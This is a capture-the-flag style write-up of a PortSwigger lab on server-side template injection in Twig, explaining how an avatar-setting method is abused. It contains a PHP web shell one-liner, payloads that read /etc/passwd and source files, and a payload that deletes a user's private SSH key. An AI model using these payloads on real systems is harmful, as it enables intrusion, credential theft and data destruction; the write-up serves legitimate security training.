# Server-side template injection with a custom exploit

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit), you'll learn: Server-side template injection with a custom exploit! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★★☆☆☆

## Background

This lab is vulnerable to [server-side template injection](https://portswigger.net/web-security/server-side-template-injection). To solve the lab, create a custom exploit to delete the file `/.ssh/id_rsa` from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224002250.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224002302.png)

As you can see, in my account page, we can change our preferred name.

In previous lab, we found that this function is vulnerable to Server-Side Template Injection(SSTI).

**To exploit this, we can intercept `Submit` request via Burp Suite:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224002523.png)

**Then, go to one of those posts in the home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224002546.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224002556.png)

**And leave a comment:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224002619.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224002635.png)

**Now, let's try to trigger a SSTI vulnerability via changing the `blog-post-author-display` parameter value:** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224002758.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224002806.png)

As you can see, our username changed to a SSTI payload, and `7 * 7` is 49.

**Next, we need to identify which template engine is the web application using.**

**To do so, I'll trigger an error:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224003011.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224003021.png)

In the error output, we can see that **it's using a template engine called Twig, which is written in PHP.**

**In [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig---code-execution), we can try to get code execution:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224003511.png)

**However, none of them are working:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224003746.png)

**Let's go to [Twig offical website](https://twig.symfony.com/):**

**In the home page, we can already see something interesting:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224003911.png)

Hmm... **Sandbox mode**. Looks like we need to do some **sandbox bypass**.

**Now, we have access to the `user` object:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224004725.png)

This will be very helpful for us.

**Let's go back to my account page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224004828.png)

**As you can see, we can upload an avatar image.**

**Let's try to upload a PHP web shell:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Server-Side-Template-Injection]
└─# echo '<?php system($_GET["cmd"]); ?>' > webshell.jpg.php
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224005007.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224005414.png)

Hmm... **This PHP file(`/home/carlos/User.php`)** checks the file MIME type is an image or not.

**Also, it's using an object `user`'s method called `setAvatar()`!**

**Let's try to upload a valid image file:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224005708.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224005741.png)

**Armed with above information, we can go back to the post comment:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224005819.png)

Notice that our avatar has been changed.

**Now, what if I call method `setAvatar()` in object `user`, and try to read `/etc/passwd`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224010023.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224010033.png)

Hmm... Too few arguments error.

The error output when we're uploading a PHP webshell, **it also shows us it needs 2 arguments: `filename` and `MIME type`.**

**Let's supply MIME type argument too:**
```php
user.setAvatar('/etc/passwd','image/png')
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224010329.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224010339.png)

**Although it looks like an error image, we can download it:** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224010459.png)

> Note: You can also send a GET request to `/avatar?avatar=wiener` to download it.

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Server-Side-Template-Injection]
└─# cat /home/nam/Downloads/avatar 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
[...]
```

**Boom! We have local file read!**

Hmm... Now we have local file read, but how to delete `carlos`'s private SSH key(`id_rsa`)?

**If we have local file read, let's read the source code of `/home/carlos/User.php`!**
```php
user.setAvatar('/home/carlos/User.php','image/png')
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224010950.png)

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Server-Side-Template-Injection]
└─# curl https://0ad70054043a656fc360ed500022001c.web-security-academy.net/avatar --cookie "session=xsy5TfCl8CHOw6Q2GAm9MP741h7RiHrV" --get --data-urlencode "avatar=wiener" -o User.php
```

**User.php:**
```php
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}

?>
```

**At the first glance, I immediately find something weird:**
```php
    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
```

**Let's take a look at the `gdprDelete()` method to delete a file:**

- Call function `rm(filename)`, and the argument is reading symbolic link file to the avatar file, which is in `users/<username>/avatar`
    - Then function `rm(filename)` try to delete the avatar file. If unable to do so, throw an error exception.

Armed with above information, we can finally delete `carlos`'s private SSH key(`id_rsa`)!

**To do so, we'll need to set the avatar file to `/home/carlos/.ssh/id_rsa`:**
```php
user.setAvatar('/home/carlos/.ssh/id_rsa','image/png')
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224012208.png)

**Then invoke method `user.gdprDelete()`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224012258.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-7/images/Pasted%20image%2020221224012304.png)

We did it!

# What we've learned:

1. Server-side template injection with a custom exploit